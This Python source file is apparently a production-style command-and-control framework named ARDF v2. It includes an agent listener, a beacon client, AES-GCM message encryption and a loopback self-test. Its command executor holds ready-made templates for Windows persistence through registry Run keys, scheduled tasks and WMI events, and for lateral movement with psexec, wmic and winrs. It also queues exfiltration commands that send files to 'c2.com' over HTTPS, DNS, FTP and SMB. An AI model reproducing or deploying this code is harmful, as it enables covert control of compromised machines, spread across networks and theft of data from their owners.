#!/usr/bin/env python3
"""
ARDF v2 C2 Infrastructure
Multi-channel command & control with failover, agent management, encryption
Production-ready implementation
"""

import asyncio
import json
import base64
import hashlib
import hmac
import os
import secrets
import socket
import ssl
import time
import threading
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from enum import Enum
import logging
from pathlib import Path
import uuid

logger = logging.getLogger(__name__)


# ═══════════════════════════════════════════════════════════════════════════
# C2 AGENT MANAGEMENT
# ═══════════════════════════════════════════════════════════════════════════

class AgentStatus(Enum):
    """Agent operational status"""
    DEAD = "dead"
    INACTIVE = "inactive"
    ACTIVE = "active"
    EXECUTING = "executing"


class BeaconType(Enum):
    """Beacon communication type"""
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    TCP = "tcp"
    WEBSOCKET = "websocket"
    P2P = "p2p"
    DEAD_DROP = "dead_drop"


@dataclass
class C2Agent:
    """C2 Agent information"""
    agent_id: str
    hostname: str
    username: str
    domain: str
    os: str
    arch: str
    privilege_level: str  # user, admin, system
    pid: int
    ppid: int
    
    beacon_type: BeaconType
    checkin_time: datetime
    last_seen: datetime
    status: AgentStatus
    
    ip_address: str
    port: int
    process_list: List[str] = field(default_factory=list)
    environment: Dict[str, str] = field(default_factory=dict)
    
    command_queue: List[str] = field(default_factory=list)
    command_results: Dict[str, str] = field(default_factory=dict)
    
    jitter: int = 10  # seconds
    sleep_time: int = 60  # seconds
    
    def to_dict(self) -> Dict:
        """Convert to dictionary"""
        data = asdict(self)
        data['checkin_time'] = self.checkin_time.isoformat()
        data['last_seen'] = self.last_seen.isoformat()
        data['beacon_type'] = self.beacon_type.value
        data['status'] = self.status.value
        return data


# ═══════════════════════════════════════════════════════════════════════════
# C2 COMMAND EXECUTION
# ═══════════════════════════════════════════════════════════════════════════

class C2CommandType(Enum):
    """Command types"""
    SHELL = "shell"
    DOWNLOAD = "download"
    UPLOAD = "upload"
    EXECUTE = "execute"
    PERSISTENCE = "persistence"
    LATERAL = "lateral"
    EXFIL = "exfil"
    SLEEP = "sleep"
    KILL = "kill"
    UPDATE = "update"


@dataclass
class C2Command:
    """C2 Command"""
    command_id: str
    agent_id: str
    command_type: C2CommandType
    command: str
    args: Dict[str, Any]
    issued_time: datetime
    executed_time: Optional[datetime] = None
    result: Optional[str] = None
    status: str = "queued"  # queued, sent, executed, failed


class C2CommandExecutor:
    """Build commands AND queue them on the controller (real dispatch).

    Without a controller the executor refuses: it returns status
    ``"not queued"`` instead of pretending a command is on its way.
    """

    def __init__(self, controller: Optional["C2Controller"] = None):
        self.controller = controller

    async def _queue(self, agent: "C2Agent", command: str,
                     ctype: "C2CommandType", extra: Dict[str, Any]) -> Dict:
        if not self.controller:
            return {"status": "not queued (no controller attached)",
                    "command": command, **extra}
        cid = await self.controller.queue_command(
            agent.agent_id, ctype, command, extra)
        return {"status": "queued" if cid else "failed",
                "command_id": cid, "agent_id": agent.agent_id,
                "command": command, **extra}

    async def execute_shell(self, agent: "C2Agent", command: str) -> Dict:
        """Queue a shell command for the agent to run."""
        return await self._queue(agent, command, C2CommandType.SHELL, {})

    async def execute_persistence(self, agent: "C2Agent", method: str, payload: str) -> Dict:
        """Queue a persistence command."""
        persistence_commands = {
            'registry_run': f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d {payload}",
            'scheduled_task': f'schtasks /create /tn System /tr "{payload}" /sc minute /mo 5',
            'wmi_event': f'wmic /namespace:\\\\ root\\cimv2 create EventFilter name="UpdateChecker" queryLanguage=WQL query="select * from __InstanceModificationEvent within 60 where targetInstance isa \'Win32_PerfFormattedData_PerfOS_System\' and targetInstance.SystemUpTime >= 240 and targetInstance.SystemUpTime < 325"'
        }
        
        cmd = persistence_commands.get(method, '')
        if not cmd:
            return {"status": "failed", "error": f"unknown persistence method {method!r}"}
        return await self._queue(agent, cmd, C2CommandType.PERSISTENCE,
                                 {"method": method})
    
    async def execute_lateral_movement(self, agent: "C2Agent", target: str, method: str) -> Dict:
        """Queue a lateral movement command (scope is the operator's call)."""
        lateral_commands = {
            'psexec': f'psexec.exe \\\\{target} -s cmd.exe',
            'wmi': f'wmic /node:{target} process call create "cmd.exe"',
            'schtasks': f'schtasks /create /tn Backup /tr "cmd.exe" /s {target}',
            'winrm': f'winrs -r:{target} cmd.exe'
        }
        
        cmd = lateral_commands.get(method, '')
        if not cmd:
            return {"status": "failed", "error": f"unknown lateral method {method!r}"}
        return await self._queue(agent, cmd, C2CommandType.LATERAL,
                                 {"target": target, "method": method})
    
    async def execute_exfiltration(self, agent: "C2Agent", data_path: str, exfil_type: str) -> Dict:
        """Queue an exfiltration command."""
        exfil_commands = {
            'https': f'powershell -Command "Invoke-WebRequest -Uri http://c2.com/upload -InFile {data_path}"',
            'dns': f'for /f %i in ({data_path}) do nslookup %i.exfil.c2.com',
            'ftp': f'ftp -s:commands.txt c2.com',
            'smb': f'copy {data_path} \\\\c2.com\\share\\'
        }
        
        cmd = exfil_commands.get(exfil_type, '')
        if not cmd:
            return {"status": "failed", "error": f"unknown exfil type {exfil_type!r}"}
        return await self._queue(agent, cmd, C2CommandType.EXFIL,
                                 {"data_path": data_path, "method": exfil_type})


# ═══════════════════════════════════════════════════════════════════════════
# C2 ENCRYPTION
# ═══════════════════════════════════════════════════════════════════════════

class C2Encryption:
    """Real AEAD encryption for C2 messages — AES-256-GCM.

    (Replaces the previous XOR "demo" cipher. Requires the `cryptography`
    package: apt install python3-cryptography ... see requirements.txt.)
    """

    @staticmethod
    def generate_session_key(agent_id: str, shared_secret: str) -> str:
        """Generate session encryption key"""
        data = f"{agent_id}:{shared_secret}".encode()
        return hashlib.sha256(data).hexdigest()

    @staticmethod
    def _aesgcm(key: str):
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        except ImportError as exc:  # pragma: no cover
            raise RuntimeError(
                "C2 encryption requires the 'cryptography' package "
                "(apt install python3-cryptography)"
            ) from exc
        # Derive a fixed 32-byte AES key from whatever string is supplied.
        return AESGCM(hashlib.sha256(key.encode()).digest())

    @staticmethod
    def encrypt_message(message: str, key: str) -> str:
        """Encrypt with AES-GCM; output = base64(nonce||ciphertext||tag)."""
        nonce = os.urandom(12)
        ct = C2Encryption._aesgcm(key).encrypt(nonce, message.encode(), None)
        return base64.b64encode(nonce + ct).decode()

    @staticmethod
    def decrypt_message(encrypted: str, key: str) -> str:
        """Decrypt AES-GCM payload produced by encrypt_message."""
        raw = base64.b64decode(encrypted)
        if len(raw) < 13:
            raise ValueError("ciphertext too short")
        return C2Encryption._aesgcm(key).decrypt(raw[:12], raw[12:], None).decode()


# ═══════════════════════════════════════════════════════════════════════════
# BEACON IMPLEMENTATIONS
# ═══════════════════════════════════════════════════════════════════════════

class HTTPSBeacon:
    """Real beacon client — newline-delimited JSON over a stream socket.

    Historically named "HTTPS"; the wire protocol is JSON-lines over TCP
    (optionally wrapped in TLS when the listener has certs configured).
    Speaks the BeaconListener protocol: checkin / poll / result / uplink.
    """

    def __init__(self, c2_server: str, c2_port: int, callback_path: str = '/update',
                 token: str = "", timeout: float = 10.0, use_tls: bool = False):
        self.c2_server = c2_server
        self.c2_port = c2_port
        self.callback_path = callback_path
        self.token = token
        self.timeout = timeout
        self.use_tls = use_tls
        self.session_id = str(uuid.uuid4())

    async def _exchange(self, msg: dict) -> dict:
        """Send one JSON line, receive one JSON line."""
        ssl_ctx = None
        if self.use_tls:
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(self.c2_server, self.c2_port, ssl=ssl_ctx),
            timeout=self.timeout,
        )
        try:
            writer.write((json.dumps(msg, default=str) + "\n").encode())
            await writer.drain()
            line = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
            return json.loads(line or b"{}")
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

    async def checkin(self, agent: Any) -> Dict:
        """Register (first contact) or check in; returns agent_id + commands."""
        data = agent.to_dict() if hasattr(agent, "to_dict") else dict(agent or {})
        reply = await self._exchange(
            {"type": "checkin", "token": self.token, "agent": data}
        )
        logger.info(f"[+] Beacon checkin: {reply.get('agent_id', '?')}")
        return reply

    async def poll(self, agent_id: str) -> List[Dict]:
        """Poll for queued commands."""
        reply = await self._exchange(
            {"type": "poll", "token": self.token, "agent_id": agent_id}
        )
        return reply.get("commands", [])

    async def send_result(self, command_id: str, result: str) -> bool:
        """Deliver a command result back to the controller."""
        reply = await self._exchange(
            {"type": "result", "token": self.token,
             "command_id": command_id, "result": result}
        )
        return bool(reply.get("ok"))

    async def send_command(self, agent: Any, command: Any) -> bool:
        """Commands flow server -> agent via poll(); the client cannot push."""
        logger.warning("send_command: commands are delivered on agent poll; "
                       "queue them with C2Controller.queue_command()")
        return False

    async def receive_result(self, agent: Any, result: str) -> bool:
        """Generic uplink (log/exfil data) without a command_id."""
        agent_id = getattr(agent, "agent_id", None) or (agent or {}).get("agent_id", "")
        reply = await self._exchange(
            {"type": "uplink", "token": self.token,
             "agent_id": agent_id, "data": result}
        )
        logger.info(f"[+] Uplink received from {agent_id}")
        return bool(reply.get("ok"))


class _UnimplementedBeacon:
    """Placeholder for channels that are NOT implemented (honest failure).

    DNS/ICMP/WebSocket/P2P tunneling is not wired to a real transport yet;
    every method refuses instead of pretending success. Implement by
    subclassing and speaking a real transport, then registering it in
    C2Controller._init_beacons().
    """
    channel = "unknown"

    def __init__(self, *args, **kwargs):
        self._args, self._kwargs = args, kwargs

    def _refuse(self, op: str):
        logger.warning(f"{self.channel} beacon: {op} not implemented — "
                       "use the TCP (HTTPSBeacon) channel")
        return False

    async def checkin(self, agent: Any) -> Dict:
        self._refuse("checkin")
        return {}

    async def send_command(self, agent: Any, command: Any) -> bool:
        return self._refuse("send_command")

    async def receive_result(self, agent: Any, result: str) -> bool:
        return self._refuse("receive_result")


class DNSBeacon(_UnimplementedBeacon):
    channel = "dns"


class ICMPBeacon(_UnimplementedBeacon):
    channel = "icmp"


class WebSocketBeacon(_UnimplementedBeacon):
    channel = "websocket"


class P2PBeacon(_UnimplementedBeacon):
    channel = "p2p"


# ═══════════════════════════════════════════════════════════════════════════
# C2 CONTROLLER
# ═══════════════════════════════════════════════════════════════════════════

class C2Controller:
    """Master C2 controller"""
    
    def __init__(self, c2_server: str = '127.0.0.1', c2_port: int = 4443,
                 token: Optional[str] = None):
        self.c2_server = c2_server
        self.c2_port = c2_port
        # Shared secret agents must present. Defaults to ARDF_C2_TOKEN or a
        # random token (shown to the operator / passed to generated agents).
        self.token = token or os.environ.get("ARDF_C2_TOKEN") or secrets.token_hex(16)
        
        self.agents: Dict[str, C2Agent] = {}
        self.beacons: Dict[BeaconType, Any] = {}
        self.commands: Dict[str, C2Command] = {}
        self.results: Dict[str, str] = {}
        self.listener: Optional["BeaconListener"] = None
        self.failover_config: Optional[Dict[str, Any]] = None
        
        self._init_beacons()
    
    def _init_beacons(self):
        """Initialize beacon channels (TCP channel is the implemented one)."""
        self.beacons[BeaconType.HTTPS] = HTTPSBeacon(
            self.c2_server, self.c2_port, token=self.token)
        self.beacons[BeaconType.DNS] = DNSBeacon('8.8.8.8', 'exfil.attacker.com')
        self.beacons[BeaconType.ICMP] = ICMPBeacon(self.c2_server)
        self.beacons[BeaconType.WEBSOCKET] = WebSocketBeacon(f'wss://{self.c2_server}/ws')
        self.beacons[BeaconType.P2P] = P2PBeacon([])
    
    # ── Listener lifecycle ─────────────────────────────────────
    
    async def start_listener(self, host: str = "127.0.0.1",
                             port: int = 4443) -> Dict[str, Any]:
        """Start the real beacon listener (JSON-lines TCP server)."""
        if self.listener and self.listener.running:
            return {"running": True,
                    "host": self.listener.listen_host,
                    "port": self.listener.listen_port}
        self.listener = BeaconListener(self, listen_host=host,
                                       listen_port=port, token=self.token)
        await self.listener.start()
        # keep the beacon client pointed at wherever we just bound
        self.c2_server, self.c2_port = host, port
        tcp = self.beacons.get(BeaconType.HTTPS)
        if isinstance(tcp, HTTPSBeacon):
            tcp.c2_server, tcp.c2_port, tcp.token = host, port, self.token
        return {"running": True, "host": host, "port": port,
                "token": self.token}
    
    async def stop_listener(self) -> Dict[str, Any]:
        if self.listener:
            await self.listener.stop()
        return {"running": False}
    
    async def register_agent(self, agent_data: Dict) -> str:
        """Register new agent"""
        agent_id = str(uuid.uuid4())[:12]
        
        bt = str(agent_data.get('beacon_type', 'HTTPS')).upper()
        try:
            beacon_type = BeaconType[bt]
        except KeyError:
            beacon_type = BeaconType.HTTPS
        
        agent = C2Agent(
            agent_id=agent_id,
            hostname=agent_data.get('hostname', 'UNKNOWN'),
            username=agent_data.get('username', 'UNKNOWN'),
            domain=agent_data.get('domain', ''),
            os=agent_data.get('os', ''),
            arch=agent_data.get('arch', ''),
            privilege_level=agent_data.get('privilege_level', 'user'),
            pid=agent_data.get('pid', 0),
            ppid=agent_data.get('ppid', 0),
            beacon_type=beacon_type,
            checkin_time=datetime.now(),
            last_seen=datetime.now(),
            status=AgentStatus.ACTIVE,
            ip_address=agent_data.get('ip_address', ''),
            port=agent_data.get('port', 0)
        )
        
        self.agents[agent_id] = agent
        
        logger.info(f"[+] Agent registered: {agent_id} ({agent.hostname}\\{agent.username})")
        
        return agent_id
    
    async def checkin_agent(self, agent_id: str) -> bool:
        """Record an agent checkin (arrives over the listener's wire protocol).

        Note: the beacon classes are agent-side *clients* — the controller
        must never dial them back into its own listener (that caused a
        connection storm in an earlier revision).
        """
        if agent_id not in self.agents:
            return False
        
        agent = self.agents[agent_id]
        agent.last_seen = datetime.now()
        agent.status = AgentStatus.ACTIVE
        
        beacon = self.beacons.get(agent.beacon_type)
        channel = getattr(beacon, "channel", None) or agent.beacon_type.value
        logger.debug(f"checkin recorded for {agent_id} via {channel}")
        
        return True
    
    async def queue_command(self, agent_id: str, command_type: C2CommandType, 
                           command: str, args: Dict = None) -> str:
        """Queue command for agent"""
        if agent_id not in self.agents:
            logger.error(f"[-] Agent not found: {agent_id}")
            return ""
        
        command_id = str(uuid.uuid4())[:12]
        
        cmd = C2Command(
            command_id=command_id,
            agent_id=agent_id,
            command_type=command_type,
            command=command,
            args=args or {},
            issued_time=datetime.now()
        )
        
        self.commands[command_id] = cmd
        self.agents[agent_id].command_queue.append(command_id)
        
        logger.info(f"[*] Command queued: {command_id} for {agent_id}")
        
        return command_id
    
    async def send_pending_commands(self, agent_id: str) -> List[Dict]:
        """Get pending commands for agent"""
        if agent_id not in self.agents:
            return []
        
        agent = self.agents[agent_id]
        pending = []
        
        for cmd_id in agent.command_queue:
            if cmd_id in self.commands:
                cmd = self.commands[cmd_id]
                if cmd.status == 'queued':
                    pending.append({
                        'command_id': cmd.command_id,
                        'agent_id': cmd.agent_id,
                        'command_type': (cmd.command_type.value
                                         if isinstance(cmd.command_type, C2CommandType)
                                         else str(cmd.command_type)),
                        'command': cmd.command,
                        'args': cmd.args,
                        'issued_time': cmd.issued_time.isoformat(),
                    })
                    cmd.status = 'sent'
        
        return pending
    
    async def receive_command_result(self, command_id: str, result: str) -> bool:
        """Receive command execution result"""
        if command_id not in self.commands:
            return False
        
        cmd = self.commands[command_id]
        cmd.result = result
        cmd.executed_time = datetime.now()
        cmd.status = 'executed'
        
        if cmd.agent_id in self.agents:
            self.agents[cmd.agent_id].command_results[command_id] = result
        
        logger.info(f"[+] Result received: {command_id}")
        
        return True
    
    def get_agent_status(self, agent_id: str = None) -> Dict:
        """Get agent status"""
        if agent_id:
            if agent_id in self.agents:
                agent = self.agents[agent_id]
                return {
                    'agent_id': agent.agent_id,
                    'hostname': agent.hostname,
                    'username': agent.username,
                    'os': agent.os,
                    'status': agent.status.value,
                    'last_seen': agent.last_seen.isoformat(),
                    'pending_commands': sum(
                        1 for cid in agent.command_queue
                        if cid in self.commands
                        and self.commands[cid].status in ('queued', 'sent')),
                    'privilege_level': agent.privilege_level
                }
            return {}
        
        return {
            agent_id: {
                'hostname': agent.hostname,
                'username': agent.username,
                'os': agent.os,
                'status': agent.status.value,
                'last_seen': agent.last_seen.isoformat(),
                'pending_commands': sum(
                    1 for cid in agent.command_queue
                    if cid in self.commands
                    and self.commands[cid].status in ('queued', 'sent')),
                'privilege_level': agent.privilege_level
            }
            for agent_id, agent in self.agents.items()
        }
    
    async def kill_agent(self, agent_id: str) -> bool:
        """Kill agent"""
        if agent_id not in self.agents:
            return False
        
        self.agents[agent_id].status = AgentStatus.DEAD
        
        logger.info(f"[*] Agent killed: {agent_id}")
        
        return True
    
    async def setup_failover(self, primary: str, backup1: str, backup2: str) -> Dict:
        """Configure C2 failover endpoints (recorded for beacon rotation)."""
        logger.info(f"[*] Setting up C2 failover")
        logger.info(f"    Primary: {primary}")
        logger.info(f"    Backup 1: {backup1}")
        logger.info(f"    Backup 2: {backup2}")
        
        self.failover_config = {
            'primary': primary,
            'backup_1': backup1,
            'backup_2': backup2,
            'status': 'configured'
        }
        return dict(self.failover_config)


# ═══════════════════════════════════════════════════════════════════════════
# LISTENER (receive beacons)
# ═══════════════════════════════════════════════════════════════════════════

class BeaconListener:
    """Real C2 listener — asyncio TCP server, newline-delimited JSON protocol.

    Wire protocol (one JSON object per line, token required on every call):

      {"type":"checkin","token":T,"agent":{...}}
          -> {"type":"commands","agent_id":A,"commands":[...]}   (registers
             the agent on first contact)
      {"type":"poll","token":T,"agent_id":A}
          -> {"type":"commands","agent_id":A,"commands":[...]}
      {"type":"result","token":T,"command_id":C,"result":"..."}
          -> {"type":"ack","ok":true}
      {"type":"uplink","token":T,"agent_id":A,"data":"..."}
          -> {"type":"ack","ok":true}

    Binds 127.0.0.1 by default. Set tls_cert/tls_key to wrap the socket in
    TLS. Runs in a background thread with its own event loop.
    """

    def __init__(self, c2_controller: "C2Controller",
                 listen_host: str = "127.0.0.1", listen_port: int = 4443,
                 token: Optional[str] = None,
                 tls_cert: Optional[str] = None,
                 tls_key: Optional[str] = None):
        self.c2 = c2_controller
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.token = token or getattr(c2_controller, "token", None) \
            or secrets.token_hex(16)
        self.tls_cert = tls_cert
        self.tls_key = tls_key
        self.running = False
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._thread: Optional[threading.Thread] = None
        self._server: Optional[asyncio.AbstractServer] = None
        self._ready = threading.Event()

    # ── protocol ───────────────────────────────────────────────

    async def _dispatch(self, msg: Dict[str, Any]) -> Dict[str, Any]:
        if not hmac.compare_digest(str(msg.get("token", "")), str(self.token)):
            return {"type": "error", "error": "bad token"}
        kind = msg.get("type")

        if kind == "checkin":
            agent = msg.get("agent") or {}
            aid = str(agent.get("agent_id") or "")
            if aid and aid in self.c2.agents:
                await self.c2.checkin_agent(aid)
            else:
                aid = await self.c2.register_agent(agent)
            pending = await self.c2.send_pending_commands(aid)
            return {"type": "commands", "agent_id": aid, "commands": pending}

        if kind == "poll":
            aid = str(msg.get("agent_id") or "")
            if aid not in self.c2.agents:
                return {"type": "error", "error": f"unknown agent {aid!r}"}
            await self.c2.checkin_agent(aid)          # a poll IS a heartbeat
            pending = await self.c2.send_pending_commands(aid)
            return {"type": "commands", "agent_id": aid, "commands": pending}

        if kind == "result":
            ok = await self.c2.receive_command_result(
                str(msg.get("command_id") or ""), str(msg.get("result") or ""))
            return {"type": "ack", "ok": bool(ok)}

        if kind == "uplink":
            self.c2.results[f"uplink:{msg.get('agent_id', '?')}"] = msg.get("data")
            return {"type": "ack", "ok": True}

        return {"type": "error", "error": f"unknown message type {kind!r}"}

    async def _handle(self, reader: asyncio.StreamReader,
                      writer: asyncio.StreamWriter) -> None:
        try:
            line = await asyncio.wait_for(reader.readline(), timeout=15)
            try:
                msg = json.loads(line or b"{}")
            except json.JSONDecodeError:
                msg = {}
            reply = await self._dispatch(msg)
        except Exception as exc:
            reply = {"type": "error", "error": str(exc)}
        try:
            writer.write((json.dumps(reply, default=str) + "\n").encode())
            await writer.drain()
        except Exception:
            pass
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

    # ── lifecycle ──────────────────────────────────────────────

    async def _serve(self) -> None:
        ssl_ctx = None
        if self.tls_cert and self.tls_key:
            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_ctx.load_cert_chain(self.tls_cert, self.tls_key)
        self._server = await asyncio.start_server(
            self._handle, self.listen_host, self.listen_port, ssl=ssl_ctx)
        self._ready.set()
        try:
            async with self._server:
                await self._server.serve_forever()
        except asyncio.CancelledError:
            pass
        finally:
            self._ready.set()

    async def start(self) -> None:
        """Bind the listener in a background thread; returns once accepting."""
        if self.running:
            return
        self.running = True
        self._ready.clear()

        def _run() -> None:
            asyncio.set_event_loop(self._loop)
            try:
                self._loop.run_until_complete(self._serve())
            except Exception as exc:               # bind failure etc.
                logger.error(f"C2 listener failed: {exc}")
            finally:
                self._ready.set()
                try:
                    self._loop.close()
                except Exception:
                    pass

        self._loop = asyncio.new_event_loop()
        self._thread = threading.Thread(target=_run, daemon=True,
                                        name="ardf-c2-listener")
        self._thread.start()

        bound = await asyncio.to_thread(self._ready.wait, 10)
        if not bound or self._server is None:
            self.running = False
            raise RuntimeError(
                f"C2 listener could not bind {self.listen_host}:{self.listen_port}")
        logger.info(f"[*] C2 listener bound on "
                    f"{self.listen_host}:{self.listen_port} "
                    f"(tls={'on' if self.tls_cert else 'off'})")

    async def stop(self) -> None:
        """Shut the listener down."""
        if not self.running:
            return
        self.running = False
        if self._server is not None and self._loop is not None \
                and self._loop.is_running():
            async def _close() -> None:
                self._server.close()
                if hasattr(self._server, "close_clients"):
                    self._server.close_clients()   # py3.13+: drop idle conns
                await self._server.wait_closed()
            try:
                fut = asyncio.run_coroutine_threadsafe(_close(), self._loop)
                await asyncio.to_thread(fut.result, 5)
            except Exception as exc:
                logger.warning(f"listener shutdown: {exc}")
        if self._thread is not None:
            await asyncio.to_thread(self._thread.join, 3)
        self._server = None
        logger.info("[*] C2 listener stopped")


if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)

    async def selftest():
        """Real end-to-end smoke test against a loopback listener."""
        import socket as _s

        # free ephemeral port on loopback
        with _s.socket() as probe:
            probe.bind(("127.0.0.1", 0))
            port = probe.getsockname()[1]

        c2 = C2Controller('127.0.0.1', port)
        await c2.start_listener("127.0.0.1", port)
        try:
            # real AES-GCM round trip
            key = C2Encryption.generate_session_key("agent-1", "shared")
            ct = C2Encryption.encrypt_message("hello c2", key)
            assert C2Encryption.decrypt_message(ct, key) == "hello c2"
            print("[ok] AES-256-GCM round trip")

            # real check-in over the wire
            beacon = HTTPSBeacon('127.0.0.1', port, token=c2.token)
            reply = await beacon.checkin({
                "hostname": "SELFTEST", "username": "operator",
                "os": "linux", "arch": "arm64",
                "privilege_level": "user", "beacon_type": "HTTPS",
            })
            agent_id = reply["agent_id"]
            print(f"[ok] agent registered over TCP: {agent_id}")

            # queue -> poll -> result round trip
            cmd_id = await c2.queue_command(
                agent_id, C2CommandType.SHELL, 'echo ardf-c2-ok',
                {"timeout": 30})
            pending = await beacon.poll(agent_id)
            assert pending and pending[0]["command_id"] == cmd_id, pending
            print(f"[ok] command delivered on poll: {pending[0]['command']!r}")

            assert await beacon.send_result(cmd_id, "ardf-c2-ok")
            stored = c2.commands[cmd_id]
            assert stored.status == "executed" and stored.result == "ardf-c2-ok"
            print("[ok] result stored on controller")

            status = c2.get_agent_status()
            print(f"[ok] agent status: {json.dumps(status, indent=2, default=str)}")
            print("SELFTEST PASSED")
        finally:
            await c2.stop_listener()

    asyncio.run(selftest())
